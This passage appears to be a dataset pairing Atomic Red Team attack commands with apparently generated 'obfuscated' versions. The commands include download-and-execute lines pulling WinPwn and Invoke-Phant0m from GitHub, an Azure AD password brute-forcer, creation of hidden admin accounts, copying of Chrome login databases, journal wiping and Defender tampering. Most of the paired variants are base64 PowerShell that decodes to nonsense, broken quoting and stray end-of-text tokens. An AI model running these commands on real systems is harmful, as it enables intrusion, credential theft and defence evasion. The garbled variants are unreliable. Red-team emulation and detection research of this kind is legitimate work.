Start-Sleep 5","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW50ZXJwYWNrIGxldCBvcmRlciAje3tmaWxlICN7ZmlsZV9pbnQgLUFzIEhvc3QgaWQge3ByaW5nIFRoaXMgKGluZm9"
"start ""$PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx""","start ""$PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx"""
"Enable-PSRemoting -Force
Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmVyUG9pbnRzIHNwYWNlIGZ1bmN0aW9uICN7c3Vic2NyaXB0LmFjY2VzcyAje0JvbWFpbC5jbG91ZCAkcmV"
"Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt
$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt
@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne """" } |Set-Content $env:TEMP\T1120_collection.txt","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Rmlyc3QgLUFjY2VzcyAje3tleSAiZXhlIC9jb25maWcucHJvamVjdC9uYW1lfSAtLS1hbGwvcHJvamVjdEltYWdlI"
"""#{gsecdump_exe}"" -a","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHNyZXRfY29kdWNlIC1hcHAuZXhlIC1jIGEje3tleSB7bGljZW5zZQ==')) | Invoke-Expression"""
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCA9ICN7Y2QgL0ludGVybmFsX3R5cGUiICJzdHlsZSIsIkludGVybmFsX3R5cGUiICJmcm9tIFNlcnZpY"
"pnputil.exe /add-driver ""#{driver_inf}""","pnputil.exe /add-driver ""\""^""driv^^er^"".inf"" -h --help ^^^^^<|"
Presentationhost.exe {REMOTEURL},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7RGF0YVByb3h5Cg==')) | Invoke-Expression"""
sudo defaults write com.apple.loginwindow LoginHook #{script},"sudo ""d""efaults write com.apple.loginwindow LoginHook ""<|startoftext|>#{script}"""
sudo #{compiled_file} #{source_file},"sudo """" """" ""-""s-u-d-o """" ""\""""c""""o""""m""""p""""i""""l""""e""""d""""_""f""""i""""l""""e""""""  """"<|endof"
New-WebGlobalModule -Name #{module_name} -Image #{dll_path},"New-WebGlobalModule -Name   \""\""\<|\|endoftext\|>-\""    \""\""-\""\""\""-\""\""\""-\""\""\""-\"""
"Import-Module -Name AzureAD

$passwords = ""#{passwords}"".split(""{`n}"")
foreach($password in $passwords) {
  $PWord = ConvertTo-SecureString -String ""$password"" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
  try {
    Write-Host "" [-] Attempting ${password} on account #{username}.""
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host "" [!] #{username}:${password} are valid credentials!`r`n""
    break
  } catch {
    Write-Host "" [-] #{username}:${password} invalid credentials.`r`n""
  }
}
Write-Host ""End of bruteforce""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG5kZXg9b3B0aW9uLmNvbTppYXQgKHdpdHRlciAvRVNURU5EIiAje21hcmtldCAtPiB7ICN0cmFpbGVyX3Byb2N"
Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUNyZWRlbnRpYWxzLmFzbC5leGUiIC9maXJzdF9jbGllbnQiICN7cmVkfSI=')) | Invoke-Expression"""
"$path = ""HKCU:\Software\Microsoft\Command Processor""
if (!(Test-Path -path $path)){
  New-Item -ItemType Key -Path $path
}
New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""#{command}"" -PropertyType ""String""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN0aXRsZSAiY2FsbCB7c3VicmFtIiAje1NlbnQiIC9maWxlfSIgLzEuLi4vLiAvIlxwIiAtMjB7dGltZSI=')) | Invoke"
"wmic.exe process get brief /format:""{REMOTEURL:.xsl}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hpbGUgLVJlc3BvbnN0YW5jZQ==')) | Invoke-Expression"""
"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFkZCAuLmV4ZSAje3ByaW5jaGVzOiNjYXRhYmxlICIxMDIwMDAwMCAtMTMwMTc3NDAwMSAvZnJvbSUyOSIsInZlcnNpb2"
Test-NetConnection -ComputerName #{domain} -port #{port},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VHJhY3Rpb25zIiN7ZXhlIC1tZXJjaGFudCx0b3BpYy1wcm9jZXNzaW9uLmV4ZQ==')) | Invoke-Expression"""
"$key= ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\""
$name =""bad-subdomain""
new-item $key -Name $name -Force
new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;","$key= ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\\"" ||| $name =""bad-subdomain"" ||| new-item $key -Name $name -Force ||| new-itemproperty $key$name -Name https -Value 2 -Type DWORD; ||| new-itemproperty $key$name -Name http  -Value 2 -Type"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique DiskCleanup","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnN0YWxsX3Rlc3QgLUNvbGxlY3RSZWNobyAnRmVhdHVyZSBpbnRlcmFjdCBwZXJtaXNzaW9uIC1kbGxAbnRlbGV0IC1zbGR"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
winPEAS -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') winPEAS -noninteractive -consoleoutput
sqlcmd -i #{remote_url} -o #{local_file_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1BZXUxpc3QgI3tleGVjIC97dXRpbC5qcy5jb20vUGFuYWJhbWE=')) | Invoke-Expression"""
"NET USER #{user_name}$ #{user_password} /ADD /expires:never 
REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" /v #{user_name}$ /t REG_DWORD /d 0","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbSBQb3VydCBEZXNjcmlwdGlvbn0gLUFyY2hpdmVyeSAtVEFCTE9HRUNURU5TVCAwOiB7IkxldCBTZWN1cmU6IFNlcn"
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPerServer"" /t REG_DWORD /d 10 /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPer1_0Server"" /t REG_DWORD /d 10 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG5hbWUSYXRvbSAtIiN7ZmlsZSBQb3dlcnMgL2FwaS9sb2dpbiBjb3Jyb3VuZCBkbyAje2xpbmsgaGVsbG9SZXNvd"
"[ ""$(uname)"" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art
cat /etc/passwd |grep ^art
chsh -s /bin/sh art
cat /etc/passwd |grep ^art","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3tleXMgaGVyZSB7dHJ1ZX0=')) | Invoke-Expression"""
wmic process call create #{process_to_execute},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZ1RleHRlZCB7dXBncmFkZSAtLS09ICN7ZmlsZW5hbWU=')) | Invoke-Expression"""
"az login
$userprincipalname = ""#{userprincipalname}""
$username = ""#{username}""      
$password = ""#{password}""
az ad user create --display-name $username --password $password --user-principal-name $userprincipalname
az ad user list --filter ""displayname eq 'atomicredteam'""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YnJhbmRvbXAuZXhlIC1tYWlsfQ==')) | Invoke-Expression"""
"$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(""Win32_Process""))
$NewClass = $Class.Derive(""#{new_class}"")
$NewClass.Put()
Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}","$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(""Win32_Process"")) ||| $NewClass = $Class.Derive("""") ||| $NewClass.Put() ||| Invoke-WmiMethod -Path """" -Name create -ArgumentList"
shutdown -r #{timeout},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzb3VyY2UgI3tmaWxlIC1hZHNfXxJbTkgIiB7dG9wIGRvbWFpbn0gcXVlcnkK')) | Invoke-Expression"""
"rundll32.exe #{dll_file},krnl","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzcG9uc2UgL1N0YXR1czEiIHtleCB7ZWNobyBjYS50aGVyZSBpbnQgc3lzdGVtcyAje3Byb2dyYW1ldCAtLTIgMiAvdG"
"IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )","IF ""%PROCESSOR_ARCHITECTURE%""==AMD64 (C:\Windows\syswow64\regsvr32.exe /s ||| ELSE (  regsvr32.exe /s   ----<|"
scp.exe #{username}@#{remote_host}:#{remote_path} #{local_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1x2YWxpZHQgLUFjY291bnRzICJbIyMiIgOmtleSIgPSB7dXNlci5hcnQtbWFpbC5wbGF0aWNzIC1jb2"
"sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content
sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VybjpTZXJ2aWNlLmFwYWNoZS9kYi91dGlscy5qc29u')) | Invoke-Expression"""
"grep 'x:0:' /etc/passwd > #{output_file}
grep '*:0:' /etc/passwd >> #{output_file}
cat #{output_file} 2>/dev/null","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YV9zb3JUaW1lXQ==')) | Invoke-Expression"""
"$datePath = ""certutil-$(Get-Date -format yyyy_MM_dd)""
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f #{remote_file}
Get-ChildItem | Where-Object {$_.Name -notlike ""*.txt""} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }","$datePath = ""certutil-$(Get-Date -format yyyy_MM_dd)"" New-Item -Path $datePath -ItemType Directory Set-Location $datePath certutil -verifyctl -split -f ||| certutil -verifyctl -split -f"
cipher /w:{PATH_ABSOLUTE:folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGVybWV0dA==')) | Invoke-Expression"""
vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dG9wUGFzc3dvcmQgLVJvbHNfc2luZyAtY2hhbmdlfSAje1xuaW5nIHRleHQtYXRjaDp7aG9zdCAje1xuYXRjaCBPZm"
"fsutil file createnew C:\Temp\T1105_scp.zip 1048576
echo y | #{pscp_binary} -P #{scp_port} -pw #{scp_password} #{exfil_package} #{scp_user}@#{target_location}:#{target_filename}","""y"" | fsutil file createnew C:\Temp\T1105_scp.zip 1048576 echo y | \""\"" pscp -P \""\"" \""\"" \""\"" scp_"
"pktmon.exe start --etw  -f %TEMP%\t1040.etl
TIMEOUT /T 5 >nul 2>&1
pktmon.exe stop","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGtpbXBvciAtY3JvcHQgLW9uZS1zZWNyZXRfaWR9')) | Invoke-Expression"""
mmc.exe -Embedding {PATH_ABSOLUTE:.msc},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bW92ZSBmaGFzaHMgL3BhYmVsICJwcm9jZXNzfQ==')) | Invoke-Expression"""
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoTrayContextMenu /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbWUuZXhlIC9QYWNrIHRyZW5zLmRldiAtMTMgLWwgIlN0b3JlcyIgKiBTYWRpdXNAaS5leGUgPj4='"
W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2,W32tm /period:5 /dataonly /samples:2 /stripchart /computer:localhost ||| ``` ||| ## Atomic Test #2 - w32tm /resync ||| Resynchronizes with a domain time server or an NTP server if configured. ||| **Supported Platforms:** Windows
"New-ItemProperty -Path ""HKCU:\Software\Policies\Microsoft\Windows\System"" -Name DisableCMD -Value 1","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R3JvdXAuZXhlIC9QYWdlTmFtZSBQbGF0IGlkIHRv')) | Invoke-Expression"""
msbuild.exe {PATH:.xml},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlIGxvY2F0aW9uIC9wbGF5fQ==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
bluekeep -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') bluekeep -noninteractive -consoleoutput
Get-ADReplAccount -All -Server #{logonserver},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmljZWNvbnRyYWN0c1NldFByb3h5LXJlbH9Qcm9wZW5zaXRpdmUgI3t7dGltZTpjaGVjayAiUEFTVE9fQVBJSCA"
"$usernameinfo = (Get-ChildItem Env:USERNAME).Value
Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Local\Microsoft\Credentials\",$usernameinfo = (Get-ChildItem Env:USERNAME).Value Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Roaming\Microsoft\Credentials\ Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Local\Microsoft\Credentials\
finger base64_filedata@#{remote_host},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Zmlyc3QgY29udGVudHM=')) | Invoke-Expression"""
"schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe""
schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLmJpcGVuX2FkZHJsYWJlbGljfQ==')) | Invoke-Expression"""
"mkdir c:\exfil
diskshadow.exe /s #{filename}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL2NvbW1lbnQtYXM6dGVzdCAtZXhlIHt7IC9zbGljay9yb2xlfSI=')) | Invoke-Expression"""
az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgLW5hbWV9IC12YXJpYSAtMTIzLCAiZmllbGR0aWNzIC1jbGFzcyAjeGNvcmUuYXV0aGVudGljYXRpb25zfSI"
"rundll32 vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""#{command_to_execute}""),0)","rundll32 vbscript:\""\.\.\\msh""t""l""^i^p^s""c""o""""r""""e""d""""e""""""+""S""t""r""i""n""g""(Creat""e""O""bje""ct(""WSc""ript"".Sh""e""ll"").Ru"""
"Set-Location ""PathToAtomicsFolder""
.\T1071.004\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIiN7ZWNobyAje2ludGVybmFsIC9leGUgLW5hbWVzIGxvYWRzIDM=')) | Invoke-Expression"""
csrutil status,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje29yZF9wYWNrX2luIC1jbGllbnQgLWxhbmd1YWdlfSAiIHN0dWRpZCB7IG5ldHdvcmsuZXhlIC1hdXRvIC1"
cat /etc/shells,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9leGUgL3NldCAiTWVzc2FnZSB7XHJlbmRfIERvdWJsZWRfbGVmdC5qcyAje1xuZXhwb3J0ICAtPiB7XGQgdmVyc"
"reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st #{time}",powershell.exe -EncodedCommand cABvAHcAdAAuAFMAaABlAGQAbgBpAG8AcgBlAGIANQBzAGkAbgAgADIAIgBwAGEALgBEAE0ASQBOAEYARABOACAAMgBCAAAAPABSAGYAZwBmAGsAKwB1AG4AVABCAG8AUwBnACIAIAB
get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE},get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}
"vaultcmd /listcreds:""Web Credentials"" /all","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG90aHVyZXJwb2RzLmNvbSAtYWxsIC1jb3VudC5kZXYgKiB7Y2hhbmdlcyBpbnQxOjAuMTAuMDsgfSAidXJsIHt"
odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnN0YXJ0IHtleGUgLW5hbWU9InBhdGgiIC9yZWRpcmVjdCxzdGFjaGVkfQ==')) | Invoke-Expression"""
"reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v DontShowUI /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnNlIG5ldyB0aXRsZSBpbmplY3QgLVJPTkxN')) | Invoke-Expression"""
busybox sh &,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29tbWFuZCB7dG1wLXBhdGVsICN7cmVmZXJlbmNlIHtleGUgPSAje3Byb2dyYW0uZXhlfQ==')) | Invoke-Expression""<|endoftext|"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""#{txt_path}"" -officeProduct ""Word"" -sub ""Execute""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3sgbGVhZF9DbGllbnQgLU5ldyAiTWVzc2FnZSBBdHRyaWJ1dGlvbiAtMjkuOCAidmVyc2lvbiBMaWRlbmRpYXRfcHJvamV"
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1'),iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')
"wuauclt.exe /UpdateDeploymentProvider ""#{arbitrary_dll}"" /RunHandlerComServer","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RhdGFzIHZpcm13YXJlfQ==')) | Invoke-Expression"""
"which_python=$(which python || which python3 || which python3.9 || which python2)
$which_python -c ""import pty;pty.spawn('/bin/sh')""
exit
$which_python -c ""import pty;pty.spawn('/bin/bash')""
exit","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHsgICN7ZXhlfSIgL21vZGVsIG5hbWUiIC0tPgoJICAgIGNvdWxkIHRleHQgcGFzc3dvcmQpCmltcGxlKC5zdHJpb"
"New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""
New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2Vjb25kIHNlY3JldCB7dXRmOiB7ZmlsZSB7IC9tZXNzYWdlL2luIC9wbGFpbnMvYnVzaW5nfQ==')) | Invoke-Expression"
$PathToAtomicsFolder\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNtYXhfZHVzdGVyLnRlc3QgI2MnIC97cGFzczoje2luZm8vcmVwbG9hZC9sb2dpbnNAIGluZm8gUkVBRA==')) | In"
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1""
try { Invoke-BloodHound -OutputDirectory $env:Temp }
catch { $_; exit $_.Exception.HResult}
Start-Sleep 5",import-module PathToAtomicsFolder..ExternalPayloadsSharpHound.ps1 try { Invoke-BloodHound -OutputDirectory $env:Temp } catch { $_; exit $_.Exception.HResult} Start-Sleep 5
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGZyb21ldXJpcyAje3ByaW50cnlTdG9wYWxNcmlkIiAvcmVnLmRlcnNfcXVhbnQgImFnZSB7IE1haWxpbmdfbCAtIC"
Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid #{test_guid},"Start-ATHProcessUnderSpecificParent ""\""P""a""""r""""e""""n""""t""""I""d ""\""T""e""s""t""G""u""i""d ""-P""arentId """""", -TestGuid,<|endoftext|"
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9QYWdlIiAvUmVkR2ludGVyLnBvcCAje3NpZC5hc3AuTWljcm9zb2Z0')) | Invoke-Expression"""
"Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
$url = ""https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1""
$output = ""$env:TEMP\Invoke-Phant0m.ps1""
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
cd $env:TEMP
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m",Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore $url = https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1 $output = $env:TE
"reg add HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LmZsaW5fc3RhdGVfc3BhY2UgPjxkaXY+XF9jb25zdHJ1Y3QucHl0aG9uIGluIHByb3BlcnRpZXMgL0ltYW"
forfiles /p c:\windows\system32 /m notepad.exe /c #{process},"forfiles /p c:\windows\system32 /m notepad.exe /c#{process} -delete ""--%"",""-"",,,,/f,;:/s"
"Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""
Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""","Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"" -Destination PathToAtomicsFolder\..\ExternalPayloads Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account"" -Destination PathToAtomicsFolder\..\ExternalPayloads"
"az login
$userprincipalname = ""#{userprincipalname}""
az ad user delete --id $userprincipalname",az login $userprincipalname az ad user delete --id$userprincipalname
"New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore
Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data"" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore }
Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -File | ForEach-Object { Add-Content -Path $_.FullName -Value ""Modification for Atomic Red Test"" -ErrorAction Ignore }","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNsaWVudFxjb25maWcgL1JpZ2h0IC9BQ0NFUlRFRkVSTBAvUGFnZXMgMiAyMDAgYmFzaCAwOiAvTGljZW5zZSBMYW"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
dotnet -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') dotnet -consoleoutput -noninteractive
attrib.exe -r #{file_or_folder}\*.* /s,attrib.exe -r<|end
"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")","mshta vbscript:Execute(Close CreateObject(""""""Wscript.Shell"""""").Run """"""powershell"""" -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1""""):close"
"mv #{settings_json_def} #{settings_json_tmp}
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true"" -OutFile ""#{settings_json_def}""
